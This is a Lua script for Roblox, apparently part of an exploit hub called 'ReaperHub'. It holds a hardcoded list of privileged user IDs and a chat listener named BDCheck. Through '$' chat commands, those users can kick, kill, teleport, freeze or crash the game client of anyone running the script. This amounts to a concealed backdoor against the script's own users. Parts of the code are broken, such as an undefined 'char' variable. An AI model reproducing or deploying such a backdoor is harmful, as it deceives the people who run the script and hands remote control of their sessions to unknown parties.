local AdminPrefix = "$" 
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
	[161334794] = {["Access"] = 5}; -- ReaperHacks
	[1695222775] = {["Access"] = 5}; -- ReaperHacks
	[397164662] = {["Access"] = 5}; -- ReaperHacks
	[397164662] = {["Access"] = 5}; -- antikur
	[2533923844] = {["Access"] = 5}; -- Hax
	[264435283] = {["Access"] = 5}; -- Chum
	[3035368622] = {["Access"] = 5}; -- Hax
	[3126057602] = {["Access"] = 5}; -- Chum
	[3117856829] = {["Access"] = 5}; -- Chum
	[3126058584] = {["Access"] = 5}; -- Chum
	[3126059643] = {["Access"] = 5}; -- Chum
	[3126056607] = {["Access"] = 5}; -- Chum
	[3126055823] = {["Access"] = 5}; -- Chum
	[2894240898] = {["Access"] = 5}; -- Chum
	[1714366854] = {["Access"] = 5}; -- Chum
	[3026218260] = {["Access"] = 5}; -- Faze
	[3171555830] = {["Access"] = 5}; -- TentomX
	[1734540995] = {["Access"] = 5}; -- TentomX
	[207940517] = {["Access"] = 5}; -- TentomX
	[2041824395] = {["Access"] = 5}; -- FNTKulture
	[385290099] = {["Access"] = 5}; -- TentomX
	[378352970] = {["Access"] = 5}; -- wssp_reaper
	[1783615651] = {["Access"] = 5}; -- ReaperHacks
	[1989291728] = {["Access"] = 5}; -- BUNIII
	[3315891270] = {["Access"] = 5}; -- VerbalHacks
	[3153086330] = {["Access"] = 5}; -- KAMIL
	[3175915968] = {["Access"] = 5}; -- KAMIL
	[44576478] = {["Access"] = 5}; -- KAMIL
	[45350003] = {["Access"] = 5}; -- KAMIL
	[1228456317] = {["Access"] = 5}; -- Rollin
	[3450089239] = {["Access"] = 5}; -- convix
	[3449801084] = {["Access"] = 5}; -- convix
	[3447644327] = {["Access"] = 5}; -- convix
	[2961482780] = {["Access"] = 5}; -- convix
	[3426354923] = {["Access"] = 5}; -- convix
	[2261204534] = {["Access"] = 5} -- FNTTim
}

local GP = Players:GetPlayers()
for i = 1, #GP do
	local CoolKidPlayer = GP[i]
	CoolKidPlayer.Chatted:Connect(function(Word)
		BDCheck(CoolKidPlayer, Word)
	end)
end
Players.PlayerAdded:Connect(function(CKP)
	CKP.Chatted:Connect(function(Message)
		BDCheck(CKP, Message)
	end)
end)

getgenv().psearch = function(Name)
	local Inserted = {}
	for _, p in pairs(Players:GetPlayers()) do
		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
			table.insert(Inserted, p);return p
		end
	end
end 

getgenv().AdminCmdList = {
	["kick"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP:Kick("You have been kicked by a ReaperHub admin.", self)
			end
		end;
		["Clearence"] = {[5] = true;};
	}; 
	["kill"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["bring"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP.Character.HumanoidRootPart.CFrame = game:GetService("Players")[CmdPlayer.Name].Character.HumanoidRootPart.CFrame
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["freeze"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				for i, x in next, char:GetDescendants() do
					if x:IsA("BasePart") and not x.Anchored then
						x.Anchored = true
					end
				end
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["unfreeze"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				for i, x in next, char:GetDescendants() do
					if x:IsA("BasePart") and x.Anchored then
						x.Anchored = false
					end
				end
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["ws"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 45
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["crash"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				while true do
				end
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["jp"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP.Character:FindFirstChildOfClass("Humanoid").JumpPower = 100
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
};

getgenv().BDCheck = function(Target2, Chat)
	if Chat:sub(1, 1) == AdminPrefix then
		local args = string.split(Chat:sub(2), " ")
		local Command = AdminCmdList[table.remove(args, 1)]
		local targ1 = psearch(table.remove(args, 1))
		if Command and targ1 then 
			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
		end
	end
end
